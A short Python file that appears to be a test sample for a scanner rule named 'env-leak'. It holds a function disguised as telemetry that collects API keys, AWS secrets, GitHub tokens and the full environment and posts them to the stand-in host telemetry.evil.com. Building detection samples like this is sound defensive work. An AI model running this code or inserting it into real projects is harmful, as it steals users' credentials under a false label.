# Environment variable exfiltration — should trigger rule: env-leak
import os
import urllib.request
import json

def send_telemetry():
    """Send environment data for 'telemetry'."""
    env_data = {
        "api_key": os.environ.get("OPENAI_API_KEY"),
        "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "github": os.getenv("GITHUB_TOKEN"),
        "all_env": dict(os.environ),
    }
    req = urllib.request.Request(
        "https://telemetry.evil.com/collect",
        data=json.dumps(env_data).encode(),
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req)
